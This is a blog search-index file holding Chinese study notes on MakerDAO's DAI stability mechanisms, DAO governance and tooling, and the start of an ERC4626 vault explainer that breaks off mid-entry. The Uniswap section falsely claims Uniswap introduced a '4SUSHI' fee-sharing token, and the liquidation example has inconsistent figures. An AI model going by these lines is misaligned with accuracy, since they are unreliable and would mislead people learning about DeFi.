<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DAI</title>
    <url>/2025/07/21/DAI/</url>
    <content><![CDATA[<p>DAI 是Maker Protocol的主要产品，Maker Protoco 是由Maker DAO来管理和维护的。</p>
<h4 id="DAI的供应量控制"><a href="#DAI的供应量控制" class="headerlink" title="DAI的供应量控制"></a>DAI的供应量控制</h4><p><strong>贷款利率</strong>： Stability fee</p>
<p><strong>存款利率</strong>： DAI Saving Rate(DSR)</p>
<p>通过控制这两个利率，来控制供应量（类似于“升息降息”）</p>
<h3 id="DAI的收入来源是什么？"><a href="#DAI的收入来源是什么？" class="headerlink" title="DAI的收入来源是什么？"></a><strong>DAI的收入来源是什么？</strong></h3><table>
<thead>
<tr>
<th>收入来源</th>
<th>简介</th>
<th>是否主要收入来源</th>
</tr>
</thead>
<tbody><tr>
<td>稳定费</td>
<td>用户铸造 DAI 时支付的利息</td>
<td>✅ 是</td>
</tr>
<tr>
<td>现实世界资产收益</td>
<td>投资国债、协议贷款等带来的实际利息收入</td>
<td>✅ 是</td>
</tr>
<tr>
<td>清算惩罚收入</td>
<td>抵押资产清算时收取的惩罚费用</td>
<td>⚠️ 次要</td>
</tr>
<tr>
<td>储蓄率利差</td>
<td>DAI 储户收益与实际投资收益之间的利差</td>
<td>⚠️ 次要</td>
</tr>
</tbody></table>
<h2 id="🔰-一、什么是-Maker-Buffer？"><a href="#🔰-一、什么是-Maker-Buffer？" class="headerlink" title="🔰 一、什么是 Maker Buffer？"></a>🔰 一、什么是 Maker Buffer？</h2><p><strong>Maker Buffer</strong> 是 MakerDAO 协议的“储备金账户”，是一个专门用来应对系统风险的<strong>资金缓冲池</strong>。</p>
<h4 id="资金来源："><a href="#资金来源：" class="headerlink" title="资金来源："></a>资金来源：</h4><ul>
<li>用户铸造 DAI 时支付的 <strong>Stability Fee（稳定费）</strong></li>
<li>用户抵押品被清算时的 <strong>Penalty Fee（清算罚金）</strong></li>
<li>投资资产的 <strong>利差收益（如 RWA 收益）中保留的一部分</strong></li>
</ul>
<p>这些收入不会马上分发给 MKR 持有人，而是先进入 Maker Buffer，积累成“应急备用金”。</p>
<hr>
<h3 id="二、Maker-Buffer-的核心作用"><a href="#二、Maker-Buffer-的核心作用" class="headerlink" title="二、Maker Buffer 的核心作用"></a>二、Maker Buffer 的核心作用</h3><table>
<thead>
<tr>
<th>作用</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>🩹 1. <strong>弥补清算亏空</strong></td>
<td>当某笔抵押贷款在清算时 ETH 跌太狠，卖出的钱还不够还债时（比如差 500 DAI），Maker Buffer 会补上这笔缺口，防止系统坏账。</td>
</tr>
<tr>
<td>💸 2. <strong>作为 DSR 支付资金池</strong></td>
<td>给用户发放 DAI 储蓄利率（DAI Savings Rate, DSR）时，部分资金来自 Buffer。</td>
</tr>
<tr>
<td>🏦 3. <strong>支撑协议运营&#x2F;治理提案</strong></td>
<td>有时社区治理会决定拿一部分 Buffer 中的资金做协议开发、流动性激励等用途。</td>
</tr>
</tbody></table>
<hr>
<h3 id="三、风险与挑战"><a href="#三、风险与挑战" class="headerlink" title="三、风险与挑战"></a>三、风险与挑战</h3><table>
<thead>
<tr>
<th>风险点</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>🧨 清算集中爆发</td>
<td>如果市场剧烈下跌，大量抵押仓同时爆仓，Maker Buffer 可能被迅速耗尽。</td>
</tr>
<tr>
<td>🪙 Buffer 不足时会铸 MKR 融资</td>
<td>若 Buffer 钱不够，系统会启动“<strong>债务拍卖</strong>”，铸造新的 MKR 卖掉换 DAI 补窟窿，这会稀释 MKR 持有者利益。</td>
</tr>
<tr>
<td>📉 收入减少时补偿能力下降</td>
<td>如果稳定费和罚金收得少（比如没人清算、利率设得很低），Buffer 增长变慢，抗风险能力减弱。</td>
</tr>
</tbody></table>
<hr>
<p>✅ 总结一句话：</p>
<p><strong>Maker Buffer 就像是 DAI 系统的安全垫和应急钱包</strong>，用来应对贷款清算亏损和支付协议运行成本，是保持 DAI 稳定和系统健康的关键一环。但一旦 Buffer 被耗尽，就可能触发更严重的机制，比如增发 MKR 来“救火”，从而影响整条链的稳定和投资者信心。</p>
<h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>假设1ETH&#x3D;2000 USD，质押了5个ETH 到Maker Vault，按照150%的超额抵押率，最多可以借出10000&#x2F;150%&#x3D;6666.67 个DAI。保险起见，用户借出5000 DAI，其余1666.67为缓冲区。</p>
<p>情形1:ETH 涨价到 3000 USD。此时5ETH&#x3D;15000USD，基于150%的抵押率，用户最多可以借出10000 DAI.</p>
<p>情形2:ETH跌到1500USD，此时5ETH&#x3D;7500USD,7500 USD&#x2F;5000 DAI&#x3D;150%。用户面临三个选择:<br>1.往Maker Vault <strong>质押更多</strong>的 ETH；（若不想被清算，就要提高抵押率）<br>2.<strong>还回（所有</strong>）5000 DAl+Stability Fee,拿回5个 ETH; （损失利息）<br>3.还回**部分 **DAl+Stability Fee，增加自己的缓冲区</p>
<h3 id="DAI的防护网之一-——-Colleteral-Auction"><a href="#DAI的防护网之一-——-Colleteral-Auction" class="headerlink" title="DAI的防护网之一 —— Colleteral Auction"></a><strong>DAI的防护网之一 —— Colleteral Auction</strong></h3><p>情形3:ETH 跌到1200 USD，此时5ETH&#x3D;6000 USD.触发清算，Keeper 介入清算流程;</p>
<ol>
<li><p>5个ETH 按照市价折扣3%进行拍卖，每次增加0.5%，直到拍卖成功;</p>
</li>
<li><p>Keeper 使用 DAI 来竞拍，价高者得;</p>
</li>
<li><p>扣除 5000 DAl+ Penalty Fee 等费用，其余 ETH 返回给用户;</p>
<blockquote>
<p>Penalty Fee惩罚费</p>
</blockquote>
</li>
</ol>
<h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>你之前用 <strong>5 个 ETH 抵押，借了 5000 个 DAI</strong>。系统要求你要保持足够高的抵押率（比如 150%），但现在 <strong>ETH 跌到了 1200 美元&#x2F;个</strong>，所以：</p>
<p>🚨 情况触发：抵押率不够，系统自动清算你</p>
<hr>
<p><strong>步骤详解</strong></p>
<p>1️⃣ 系统把你的 5 个 ETH 拿去拍卖</p>
<ul>
<li>拍卖起始价打个 <strong>97 折</strong>（也就是 3% 折扣）吸引人参与；</li>
<li>如果没人出价，**每次加价 0.5%**，直到有人愿意买；</li>
<li>目的：快速把 ETH 卖掉，换回 DAI，偿还你的欠款。</li>
</ul>
<p>2️⃣ Keeper 是谁？他们做什么？</p>
<ul>
<li>Keeper 就是链上的“机器人”或者参与者；</li>
<li>他们会用自己的 <strong>DAI 来参与竞拍</strong> ETH，谁出价最高，谁就拿走 ETH；</li>
<li>他们之所以愿意买，是因为 ETH 起拍价低，有套利空间。</li>
</ul>
<p>3️⃣ 清算后的处理方式：</p>
<ul>
<li>系统用拍卖得来的 <strong>DAI 先还你的 5000 DAI 债务</strong>；</li>
<li>然后还要收你一笔 <strong>清算罚金（Penalty Fee）</strong>，比如 13%；</li>
<li><strong>剩下的 ETH（如果有多余）会还给你</strong>；<ul>
<li>如果拍得价格高，那 ETH 卖得好，可能还有剩；</li>
<li>如果拍得低，那你就亏了更多。</li>
</ul>
</li>
</ul>
<hr>
<p>✅ 举个具体数字例子：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>数值</th>
</tr>
</thead>
<tbody><tr>
<td>你抵押的 ETH</td>
<td>5 个</td>
</tr>
<tr>
<td>当前 ETH 价格</td>
<td>$1200</td>
</tr>
<tr>
<td>总价值</td>
<td>$6000</td>
</tr>
<tr>
<td>你欠的 DAI</td>
<td>5000</td>
</tr>
<tr>
<td>拍卖起始价</td>
<td>5 ETH 按 $1164&#x2F;ETH（3% 折扣）开始</td>
</tr>
</tbody></table>
<ul>
<li>如果 Keeper 拍到了 5 ETH，支付了 $6100 的 DAI，系统拿出其中：<ul>
<li>5000 DAI 用来还你的贷款，</li>
<li>比如 650 DAI 作为罚金，</li>
<li>剩下的那点（如 450 DAI 相当的 ETH）退还你。</li>
</ul>
</li>
</ul>
<hr>
<p><strong>💡总结一句话</strong>：</p>
<p>ETH 跌了，你抵押不够了，系统强制清算你，拍卖掉你的 ETH，先还你的欠款和罚金，<strong>剩下的才还你，不一定有剩，你可能亏钱。</strong></p>
<h3 id="DAI的防护网之二-Maker-Buffer"><a href="#DAI的防护网之二-Maker-Buffer" class="headerlink" title="DAI的防护网之二-Maker Buffer"></a><strong>DAI的防护网之二-Maker Buffer</strong></h3><p>Stability Fee&#x2F;Penalty Fee等缓慢积攒;</p>
<p>情形4: ETH 跌到 900 USD，此时5 ETH&#x3D;4500 USD，拍卖后的缺口为 500 USD;</p>
<p>​			从Maker Buffer 支付 500弥补缺口;</p>
<h4 id="解释：-1"><a href="#解释：-1" class="headerlink" title="解释："></a>解释：</h4><p><strong>🛡 DAI 的防护网之二 —— Maker Buffer 是什么？</strong></p>
<p>想象一下 Maker 协议有个“<strong>小金库</strong>”，这个金库就叫 <strong>Maker Buffer</strong>。<br> 它是通过系统运行时收取的 <strong>利息（Stability Fee）</strong> 和 <strong>清算罚金（Penalty Fee）</strong> 一点点积累起来的。</p>
<p>就像你平时把赚的钱攒起来，留着应急用。</p>
<hr>
<p><strong>🚨 情景 4：ETH 大跌，清算后还差钱怎么办？</strong></p>
<ul>
<li>原本你用 <strong>5 个 ETH 抵押，借了 5000 个 DAI</strong>；</li>
<li>现在 ETH <strong>跌到 900 美元</strong>，所以你这 5 个 ETH 现在只值 <strong>4500 美元</strong>；</li>
<li>系统拍卖 ETH 得到的钱不够还你的 5000 DAI 欠款，<strong>差了 500 DAI</strong>；</li>
</ul>
<p><strong>💡那差的钱去哪补？</strong></p>
<ul>
<li>系统就会从这个“<strong>Maker Buffer（金库）里掏出 500 DAI</strong>”来补上这个窟窿；</li>
<li>保证整个系统不会因为你这一单亏损就破产。</li>
</ul>
<hr>
<p>✅ <strong>总结一句话：</strong></p>
<p>ETH 跌太狠，你的抵押品卖了也不够还钱，Maker 会动用自己之前攒下的利息和罚金收入（Maker Buffer）来“垫付”这笔差额，确保系统健康运行、DAI 不出事。</p>
<h3 id="DAl-的防护网之三–-Debt-Auction"><a href="#DAl-的防护网之三–-Debt-Auction" class="headerlink" title="DAl 的防护网之三– Debt Auction"></a><strong>DAl 的防护网之三– Debt Auction</strong></h3><p>情形5:ETH跌到 900USD，此时5ETH&#x3D;4500USD，拍卖后的缺口为500 USD，而Maker Buffer 里只有100 DAI，资金缺口为400 USD。</p>
<ul>
<li>增发 MKR 进行拍卖;</li>
<li>用户使用 DAI参与拍卖，拍卖得到的 DAl来弥补缺口;</li>
<li>一种对社区治理惩罚的方式;</li>
</ul>
<h4 id="解释：-2"><a href="#解释：-2" class="headerlink" title="解释："></a>解释：</h4><hr>
<p>这是 DAI 的第三道“防护网”，叫做 Debt Auction，意思是“债务拍卖”。</p>
<p>假设你之前用 5 个 ETH 抵押借了 5000 DAI，但现在 ETH 跌到 900 美元，总共才值 4500 美元。<br> 系统把你的 ETH 拍卖掉后，只换回了 4500 DAI，还有 500 DAI 的窟窿没补上。</p>
<p>系统本来可以从 Maker Buffer（金库）里拿钱补，但现在里面只剩 100 DAI，还是不够，差 400 DAI。</p>
<p>这时候，系统就会启动最后一招：增发 MKR（Maker 的治理代币）来卖钱。</p>
<p>具体做法是：<br> 系统“印”出一些新的 MKR，放到市场上进行拍卖；<br> 用户用 DAI 去竞拍这些 MKR，谁出价高就能买到；<br> 拍卖收到的 DAI 就被用来填补那 400 DAI 的缺口。</p>
<p>这相当于社区治理的惩罚措施：<br> 因为系统风险管理不到位、风险太高，所以最后要靠稀释 MKR 持有者的利益来“兜底”。</p>
<p>换句话说，MKR 被增发了，老持有者手里的 MKR 相对贬值了，社区承担了代价。（通货膨胀了）</p>
<hr>
<p><strong>总结一句话：</strong><br> 当拍卖抵押品的钱不够还债、金库又没钱时，系统就会增发 MKR 拍卖换钱来补窟窿，这种机制确保 DAI 不出问题，但会惩罚整个社区和 MKR 持有者。</p>
<h3 id="MakerDAO-的运行机制"><a href="#MakerDAO-的运行机制" class="headerlink" title="MakerDAO 的运行机制"></a><strong>MakerDAO 的运行机制</strong></h3><p>【一】提案阶段</p>
<ol>
<li>发起提案：任何 MKR 持有人都可以发起新提案；</li>
<li>在 MakerDAO 社区进行公开讨论；</li>
<li>提交优化后的正式提案；</li>
<li>Risk Team（风险评估团队）对提案进行评估和建模分析。</li>
</ol>
<p>【二】投票阶段</p>
<ul>
<li>每一个 MKR 代币代表一票投票权，支持投票代理（Delegate）；</li>
<li>投票期通常持续 7 天；</li>
<li>最终根据投票结果决定提案是否通过（一般需超过 4% MKR 持有者同意）。</li>
</ul>
<p><img src="https://s2.loli.net/2025/07/21/9z7ABjeF3qyRhwC.jpg" alt=".jpg"></p>
]]></content>
      <tags>
        <tag>DeFi</tag>
      </tags>
  </entry>
  <entry>
    <title>DAO</title>
    <url>/2025/04/12/DAO/</url>
    <content><![CDATA[<h2 id="一、DAO-基础概念"><a href="#一、DAO-基础概念" class="headerlink" title="一、DAO 基础概念"></a>一、DAO 基础概念</h2><h3 id="什么是-DAO（去中心化自治组织）"><a href="#什么是-DAO（去中心化自治组织）" class="headerlink" title="什么是 DAO（去中心化自治组织）"></a>什么是 DAO（去中心化自治组织）</h3><p><strong>定义：</strong></p>
<ul>
<li><strong>Decentralized</strong>：基于区块链，由利益相关者共同决策。</li>
<li><strong>Autonomous</strong>：运行逻辑由智能合约执行，在特定情况下无需人工干预。</li>
<li>DAO 是<strong>一个自主存在于网络中的实体，由公开透明的代码编码组织规则，管理组织资产</strong>。</li>
</ul>
<p><strong>特点：</strong></p>
<ul>
<li>社区治理：以集体方式作出决策（某种方式为自己做决定）。</li>
<li>资产管理：拥有和分配内部资产的能力（包含内部资产，且它有能力将该资产用于奖励某些活动）。</li>
</ul>
<h3 id="DAO-vs-传统公司"><a href="#DAO-vs-传统公司" class="headerlink" title="DAO vs 传统公司"></a>DAO vs 传统公司</h3><table>
<thead>
<tr>
<th>特性</th>
<th>DAO</th>
<th>公司</th>
</tr>
</thead>
<tbody><tr>
<td>管理结构</td>
<td>自下而上，去中心化</td>
<td>自上而下，层级分明</td>
</tr>
<tr>
<td>决策透明度</td>
<td>公开透明</td>
<td>相对封闭</td>
</tr>
<tr>
<td>成员参与方式</td>
<td>自主发起，自愿参与</td>
<td>由雇佣关系或股份结构决定</td>
</tr>
<tr>
<td>目标</td>
<td>社区共识，长期共赢</td>
<td>股东利润最大化</td>
</tr>
</tbody></table>
<h3 id="DAO-的类别"><a href="#DAO-的类别" class="headerlink" title="DAO 的类别"></a>DAO 的类别</h3><ul>
<li><strong>Protocol DAO</strong>：Uniswap、MakerDAO  </li>
<li><strong>Social DAO</strong>：SeedClub、FWB  </li>
<li><strong>Venture DAO</strong>：CultDAO  </li>
<li><strong>Media DAO</strong>：Bankless DAO  </li>
<li><strong>Grant DAO</strong>：Gitcoin</li>
</ul>
<p><img src="https://s2.loli.net/2025/04/28/q2ae6JXV5L9miAc.jpg" alt="1.png"></p>
<h3 id="dao究竟在做什么"><a href="#dao究竟在做什么" class="headerlink" title="dao究竟在做什么"></a>dao究竟在做什么</h3><h4 id="（1）去中心化资产管理"><a href="#（1）去中心化资产管理" class="headerlink" title="（1）去中心化资产管理"></a><strong>（1）去中心化资产管理</strong></h4><ul>
<li><strong>案例</strong>：<em>ConstitutionDAO</em> 众筹资金竞拍美国宪法副本，<em>BitDAO</em> 管理数十亿美元加密资产。</li>
<li><strong>方式</strong>：集体决定资金用途（投资、捐赠等），避免个人操控。</li>
</ul>
<h4 id="（2）协议-项目治理"><a href="#（2）协议-项目治理" class="headerlink" title="（2）协议&#x2F;项目治理"></a><strong>（2）协议&#x2F;项目治理</strong></h4><ul>
<li><strong>案例</strong>：<em>Uniswap</em>、<em>Aave</em> 等DeFi协议由DAO决定手续费、上新资产等规则。</li>
<li><strong>方式</strong>：代币持有者投票升级智能合约或调整参数。</li>
</ul>
<h4 id="（3）社区协作与创作"><a href="#（3）社区协作与创作" class="headerlink" title="（3）社区协作与创作"></a><strong>（3）社区协作与创作</strong></h4><ul>
<li><strong>案例</strong>：<em>PleasrDAO</em> 收藏数字艺术并资助创作者，<em>BanklessDAO</em> 推动加密教育。</li>
<li><strong>方式</strong>：成员提案并投票分配资源，激励内容生产或开发。</li>
</ul>
<h4 id="（4）投资与孵化"><a href="#（4）投资与孵化" class="headerlink" title="（4）投资与孵化"></a><strong>（4）投资与孵化</strong></h4><ul>
<li><strong>案例</strong>：<em>MetaCartel Ventures</em> 投资早期Web3项目，收益返还成员。</li>
<li><strong>方式</strong>：DAO作为风投基金，集体决策投资项目。</li>
</ul>
<h4 id="（5）社会实验与公益"><a href="#（5）社会实验与公益" class="headerlink" title="（5）社会实验与公益"></a><strong>（5）社会实验与公益</strong></h4><ul>
<li><strong>案例</strong>：<em>Gitcoin DAO</em> 资助开源开发，<em>UkraineDAO</em> 募集战争援助资金。</li>
<li><strong>方式</strong>：透明化资金流向，社区监督执行。</li>
</ul>
<h2 id="二、DAO-的构建与实践"><a href="#二、DAO-的构建与实践" class="headerlink" title="二、DAO 的构建与实践"></a>二、DAO 的构建与实践</h2><h3 id="如何做一个-DAO？"><a href="#如何做一个-DAO？" class="headerlink" title="如何做一个 DAO？"></a>如何做一个 DAO？</h3><ol>
<li><strong>明确目标和社区共识</strong></li>
<li><strong>选择合适的治理模型</strong></li>
<li><strong>配置 DAO 工具（见下方工具章节）</strong></li>
<li><strong>启动并运作：提案 → 投票 → 执行</strong></li>
</ol>
<h3 id="DAO-的优势"><a href="#DAO-的优势" class="headerlink" title="DAO 的优势"></a>DAO 的优势</h3><ul>
<li><strong>去信任（Trustless）</strong></li>
<li><strong>自下而上的创新</strong></li>
<li><strong>利益相关者即用户（User &#x3D; Owner）</strong></li>
<li><strong>网络效应驱动</strong></li>
<li><strong>共建共识，打造品牌</strong></li>
</ul>
<h3 id="DAO-面临的效率问题及解决方案"><a href="#DAO-面临的效率问题及解决方案" class="headerlink" title="DAO 面临的效率问题及解决方案"></a>DAO 面临的效率问题及解决方案</h3><p><strong>问题：</strong></p>
<ul>
<li>基础设施不完善</li>
<li>仍存在中心化现象</li>
<li>缺乏治理模型标准</li>
</ul>
<p><strong>解决办法：</strong></p>
<ul>
<li>引入 DAO 工具</li>
<li>适度中心化（局部中心化）</li>
<li>权益分离</li>
<li>治理模型结合：直接民主 + 代议制民主</li>
</ul>
<hr>
<h2 id="三、DAO-治理实践"><a href="#三、DAO-治理实践" class="headerlink" title="三、DAO 治理实践"></a>三、DAO 治理实践</h2><h3 id="治理流程要点"><a href="#治理流程要点" class="headerlink" title="治理流程要点"></a>治理流程要点</h3><ul>
<li><strong>任务发布</strong>：提升社区参与效率</li>
<li><strong>贡献记录</strong>：如使用 Proof-of-Work（非挖矿）方式记录贡献</li>
<li><strong>提案与投票制度设计</strong>：<ul>
<li>谁可以提案</li>
<li>谁可以投票</li>
<li>票数达标机制（需要预设基础：大于百分之多少的票，结果才是有效的（或者多次投票）</li>
</ul>
</li>
<li><strong>激励机制</strong>：<ul>
<li>不可交易积分系统</li>
<li>按工作时间 * 工作难度评分</li>
</ul>
</li>
</ul>
<p><img src="https://s2.loli.net/2025/04/28/dOaSk3wGWU5BXHA.jpg" alt="2.png"></p>
<p><img src="https://s2.loli.net/2025/04/28/ZWdCMEwU4sBLSP1.jpg" alt="3.png"></p>
<hr>
<h2 id="四、DAO-工具生态"><a href="#四、DAO-工具生态" class="headerlink" title="四、DAO 工具生态"></a>四、DAO 工具生态</h2><h3 id="社区治理类"><a href="#社区治理类" class="headerlink" title="社区治理类"></a>社区治理类</h3><ul>
<li><strong>Snapshot</strong>：查看&#x2F;管理治理提案及投票情况，支持自定义逻辑。</li>
<li><strong>Tally</strong>：链上投票与提案执行平台。</li>
</ul>
<h3 id="国库管理与多签"><a href="#国库管理与多签" class="headerlink" title="国库管理与多签"></a>国库管理与多签</h3><ul>
<li><strong>Safe（多签钱包）</strong>：资产管理，需多方签名确认操作。</li>
<li><strong>操作流程</strong>：<ul>
<li>创建多签</li>
<li>注入资产</li>
<li>发起并签署操作</li>
</ul>
</li>
</ul>
<h3 id="薪酬与奖励系统"><a href="#薪酬与奖励系统" class="headerlink" title="薪酬与奖励系统"></a>薪酬与奖励系统</h3><table>
<thead>
<tr>
<th>工具名称</th>
<th>功能说明</th>
</tr>
</thead>
<tbody><tr>
<td>Utopia</td>
<td>空投、报销</td>
</tr>
<tr>
<td>Parcel</td>
<td>批量支付</td>
</tr>
<tr>
<td>Superfluid</td>
<td>实时流式支付</td>
</tr>
<tr>
<td>Dework</td>
<td>赏金平台，任务驱动贡献</td>
</tr>
</tbody></table>
<h3 id="Dao关于社区治理的工具"><a href="#Dao关于社区治理的工具" class="headerlink" title="Dao关于社区治理的工具"></a>Dao关于社区治理的工具</h3><ol>
<li>Snapshot</li>
</ol>
<p>作用：1.直接在snapshot对应的DAO去治理提案&#x2F;投票情况查看</p>
<p>​			2.可以用代码编写自己的逻辑</p>
<ol start="2">
<li>Tally</li>
</ol>
<h3 id="Dao关于国库管理的工具"><a href="#Dao关于国库管理的工具" class="headerlink" title="Dao关于国库管理的工具"></a>Dao关于国库管理的工具</h3><p>(用于激励和社区活动)</p>
<h4 id="多签类"><a href="#多签类" class="headerlink" title="多签类"></a>多签类</h4><ol>
<li>Safe</li>
</ol>
<p>(用法：在社区投票讨论通过后，由有多签权限的人发起多签 然后进行以下几种做法)</p>
<p>创建多签</p>
<p>注入资产</p>
<p>发起多签</p>
<p>签名</p>
<h4 id="薪酬支付类"><a href="#薪酬支付类" class="headerlink" title="薪酬支付类"></a>薪酬支付类</h4><ol>
<li><p>Utopia(支持空投 报销）</p>
</li>
<li><p>Parcel(批量支付）</p>
</li>
<li><p>Superfluid(流支付）</p>
</li>
<li><p>Dework(赏金平台）</p>
</li>
</ol>
<h4 id="国库管理类"><a href="#国库管理类" class="headerlink" title="国库管理类"></a>国库管理类</h4><p>（根据贡献自动分发Token）</p>
<p>定义并铸造代币</p>
<p>确定分发规则</p>
<p>贡献者进行工作</p>
<p>自动获得奖励</p>
<ol>
<li><p>可发起捐赠融资 </p>
</li>
<li><p>质押</p>
</li>
<li><p>策展传播</p>
</li>
</ol>
<p>举例：Nutbox</p>
<h3 id="DAO操作系统"><a href="#DAO操作系统" class="headerlink" title="DAO操作系统"></a>DAO操作系统</h3><h4 id="一．"><a href="#一．" class="headerlink" title="一．"></a>一．</h4><ol>
<li><p><strong>Aragon</strong></p>
</li>
<li><p><strong>Colony</strong></p>
</li>
<li><p><strong>DAOHaus</strong></p>
</li>
</ol>
<p>MetaCartel Ventures</p>
<h4 id="二-Nouns-build-之-Nouns-DAO"><a href="#二-Nouns-build-之-Nouns-DAO" class="headerlink" title="二. Nouns.build 之 Nouns DAO"></a>二. Nouns.build 之 Nouns DAO</h4><p>创新点：有流行性创意性，丰富。</p>
<h3 id="其他工具—任务平台"><a href="#其他工具—任务平台" class="headerlink" title="其他工具—任务平台"></a>其他工具—任务平台</h3><table>
<thead>
<tr>
<th>类型</th>
<th>工具</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>教育&#x2F;任务</td>
<td>RabbitHole</td>
<td>学习与任务完成</td>
</tr>
<tr>
<td>数据分析</td>
<td>DeepDAO</td>
<td>DAO 分析平台</td>
</tr>
<tr>
<td>众筹&#x2F;NFT</td>
<td>PartyBid</td>
<td>联合竞拍平台</td>
</tr>
<tr>
<td>贡献评估</td>
<td>Coordinape、Sourcecred</td>
<td>同行评估、声誉评分</td>
</tr>
</tbody></table>
<blockquote>
<p>工具众多，强调「可组合性」，可类似 WordPress 配置插件组合使用。</p>
</blockquote>
<hr>
<h2 id="五、DAO-实践案例"><a href="#五、DAO-实践案例" class="headerlink" title="五、DAO 实践案例"></a>五、DAO 实践案例</h2><h3 id="The-DAO"><a href="#The-DAO" class="headerlink" title="The DAO"></a>The DAO</h3><ul>
<li>第一个真正意义上的去中心化自治组织。</li>
</ul>
<h3 id="Uniswap-DAO"><a href="#Uniswap-DAO" class="headerlink" title="Uniswap DAO"></a>Uniswap DAO</h3><ul>
<li>初期手续费（0.3%）全部归 LP 所有。</li>
<li>后期引入治理代币 UNI</li>
<li>Uniswap确实引入了4SUSHI代币，将部分手续费分配给代币持有者。</li>
<li>UNI代币赋予持有者治理权限，包括提案和投票。</li>
</ul>
<h3 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h3><ul>
<li>治理代币的设计通常旨在确保治理权力掌握在积极参与的社区成员手中，直接转让可能会削弱治理的稳定性和参与度。</li>
<li>许多DAO采用多代币模型或不同的机制来区分治理和激励功能。</li>
<li>DAO通常注重长期价值和社区参与</li>
</ul>
<hr>
<h2 id="六、加入-DAO-的路径"><a href="#六、加入-DAO-的路径" class="headerlink" title="六、加入 DAO 的路径"></a>六、加入 DAO 的路径</h2><h3 id="如何选择-DAO？"><a href="#如何选择-DAO？" class="headerlink" title="如何选择 DAO？"></a>如何选择 DAO？</h3><ol>
<li>DAO 阶段是否适合你的参与水平</li>
<li>回答两个问题：<ul>
<li>团队是否有能力做成事情？</li>
<li>如果做成了，能否公平分配收益？</li>
</ul>
</li>
<li>考察指标：<ul>
<li>团队调性、愿景、执行力</li>
<li>社区氛围（vibe）</li>
<li>经济模型、价值捕获能力</li>
</ul>
</li>
</ol>
<h3 id="加密原生路径建议"><a href="#加密原生路径建议" class="headerlink" title="加密原生路径建议"></a>加密原生路径建议</h3><ul>
<li>加入早期 DAO&#x2F;公链生态</li>
<li>使用和贡献开源工具</li>
<li>强调精简和产品市场匹配</li>
</ul>
<hr>
<h2 id="七、Web3-与投资思维"><a href="#七、Web3-与投资思维" class="headerlink" title="七、Web3 与投资思维"></a>七、Web3 与投资思维</h2><h3 id="Web3-思维框架"><a href="#Web3-思维框架" class="headerlink" title="Web3 思维框架"></a>Web3 思维框架</h3><ul>
<li><strong>所有权逻辑：</strong><ul>
<li>Web2：所有权集中 → 股东为核心</li>
<li>Web3：使用即所有 → 利益相关者为核心</li>
</ul>
</li>
<li><strong>共赢网络：</strong><ul>
<li>鼓励用户&#x2F;开发者共同建设与享有收益</li>
</ul>
</li>
</ul>
<hr>
<h2 id="八、项目研判逻辑"><a href="#八、项目研判逻辑" class="headerlink" title="八、项目研判逻辑"></a>八、项目研判逻辑</h2><p><img src="https://s2.loli.net/2025/04/28/fISF6mjwner13q9.jpg" alt="4.png"></p>
<h3 id="一、赛道判断"><a href="#一、赛道判断" class="headerlink" title="一、赛道判断"></a>一、赛道判断</h3><ul>
<li>是否解决关键问题（速度、安全、成本、隐私）</li>
<li>市场是否足够大</li>
<li>技术是否在投资周期内可成熟</li>
</ul>
<h3 id="二、项目价值判断（1-2）"><a href="#二、项目价值判断（1-2）" class="headerlink" title="二、项目价值判断（1&#x2F;2）"></a>二、项目价值判断（1&#x2F;2）</h3><h4 id="定性分析："><a href="#定性分析：" class="headerlink" title="定性分析："></a>定性分析：</h4><ul>
<li>商业逻辑是否闭环</li>
<li>业务模式是否合理</li>
<li>团队背景与叙事独特性</li>
<li>核心竞争力是否可持续</li>
</ul>
<h4 id="定量分析："><a href="#定量分析：" class="headerlink" title="定量分析："></a>定量分析：</h4><ul>
<li>链上数据是否活跃</li>
<li>社区热度</li>
<li>相对估值（如 FDV&#x2F;TVL）</li>
<li>绝对估值（收入、利润、DCF）</li>
</ul>
<h3 id="三、项目风险分析（2-2）"><a href="#三、项目风险分析（2-2）" class="headerlink" title="三、项目风险分析（2&#x2F;2）"></a>三、项目风险分析（2&#x2F;2）</h3><h4 id="不足："><a href="#不足：" class="headerlink" title="不足："></a>不足：</h4><ul>
<li>用户定位模糊</li>
<li>技术不先进</li>
<li>竞争激烈</li>
</ul>
<h4 id="退出机制："><a href="#退出机制：" class="headerlink" title="退出机制："></a>退出机制：</h4><ul>
<li>原投资逻辑失效</li>
<li>已实现收益目标</li>
<li>存在更优投资标的</li>
</ul>
<hr>
<blockquote>
<p><strong>备注：</strong>部分 DAO 创始人保留一票否决权以保护社区和治理秩序。</p>
</blockquote>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>回溯性空投：创造收益</p>
<p>如何 Crypto Native?(参见Twitter:CryptoNiels27)</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC4626详解</title>
    <url>/2025/07/24/ERC4626%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p><strong>Vault（保险库）</strong> 通常指一种<strong>资金管理和收益策略工具</strong>，主要用于 DeFi（去中心化金融）协议中，用来帮助用户<strong>自动化收益最大化</strong>，降低操作难度和 Gas 成本。</p>
<h3 id="Vault-的主要功能"><a href="#Vault-的主要功能" class="headerlink" title="Vault 的主要功能"></a><strong>Vault 的主要功能</strong></h3><ol>
<li><strong>自动复投</strong><br> Vault 会将挖矿奖励、利息等收益，自动复投到原策略中，提升复利效应，用户不需要手动操作。</li>
<li><strong>策略自动化</strong><br> 比如 Yearn Finance 的 Vault，会根据链上数据动态调整策略，将资金投向收益更高的 DeFi 协议。</li>
<li><strong>降低 Gas 成本</strong><br> 单个用户频繁操作会耗费大量 Gas，而 Vault 将资金集中，批量执行操作，摊薄 Gas 成本。</li>
<li><strong>风险隔离</strong><br> 不同策略可以部署在不同的 Vault 中，用户可以根据风险偏好选择。</li>
<li><strong>yield farming&#x2F;借贷&#x2F;质押</strong></li>
</ol>
<blockquote>
